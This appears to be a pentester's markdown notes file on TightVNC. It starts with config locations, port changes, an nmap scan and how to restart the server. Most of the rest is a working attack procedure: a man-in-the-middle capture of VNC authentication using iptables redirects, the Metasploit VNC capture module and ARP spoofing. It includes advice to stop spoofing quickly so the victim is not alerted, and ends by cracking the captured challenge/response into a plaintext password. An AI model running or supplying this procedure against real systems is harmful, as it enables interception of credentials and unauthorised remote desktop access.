# Tight VNC config files:
- `/etc/tightvncserver.conf`
- `/usr/bin/vncserver`

---

# changing default port:
in `/usr/bin/vncserver` @ line 226:
```
$vncPort = <DESIRED_PORT_NUMBER>;
```

---

# nmap VNC information script
```bash
nmap -p 5902 --script vnc-info <TARGET_IP>
```

---

# restarting VNC server is a unlike other services
## Step #1: find the running vnc processes
```bash
ps -ef | grep -i vnc
```
### sample output:
```
root        3187    2380  1 14:38 pts/2    00:00:00 Xtightvnc :2 -desktop X -auth /run/user/1000/.mutter-Xwaylandauth.G3AHP1 -geometry 1024x768 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5902 -fp /usr/share/fonts/X11/misc/,/usr/share/fonts/X11/Type1/,/usr/share/fonts/X11/75dpi/,/usr/share/fonts/X11/100dpi/ -co /etc/X11/rgb
root        3536    3141  0 14:38 pts/2    00:00:00 grep --color=auto -i vnc
```

## Step #2: In the previous output, note the number next to the "Xtighvnc" process --> `:2`

## Step #3: use the `vncserver` command with the `-kill` flag and the display number `:2`
```bash
vncserver -kill :2
```
### output:
```
vncserver -kill :2
Killing Xtightvnc process ID 3187
```

---

# VNC MitM: Authentication Capture
## Step #1: make sure ipv4 forwarding is enabled:
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## Step #2: create `iptables` rule to forward traffic
```bash
iptables -t nat -A PREROUTING -p tcp -d <VNC_SERVER_IP> --dport <VNC_PORT> -j REDIRECT --to-ports <VNC_PORT>
```

## Step #3: start the metasploit VNC capture module
```
use auxiliary/server/capture/vnc
set SRVHOST <KALI_IP>
set SRVPORT <VNC_PORT>
run
```

## Step #4: start arp spoofing the VNC server using ettercap

## Step #5: wait for the client to authenticate and capture the challenge/response.
### Output:
```
[+] 20.20.20.130:49768 - Challenge: 00112233445566778899aabbccddeeff; Response: c8afaba5bf331b016ca6305c016e20cd
```

## Step #6: to prevent alerting the victim, stop the arp spoofing right after capture. because the capture server will stop actual authentication attempts.

## Step #7: delete the `iptables` rules
```bash
iptables -t nat -D PREROUTING -p tcp -d <VNC_SERVER_IP> --dport <VNC_PORT> -j REDIRECT --to-ports <VNC_PORT>
```

## Step #8: using `vncrack_s` tool (in our evilbins repository), crack the challenge and response to get the password
```bash
./vncrack_s -c 00112233445566778899aabbccddeeff -r c8afaba5bf331b016ca6305c016e20cd -w /usr/share/wordlists/rockyou.txt 
```
### Output:
```
VNCrack - by Phenoelit (http://www.phenoelit.de/)
$Revision: 1.17 $

>>>>>>>>>>>>>>>
Password: Abc123!!
>>>>>>>>>>>>>>>
```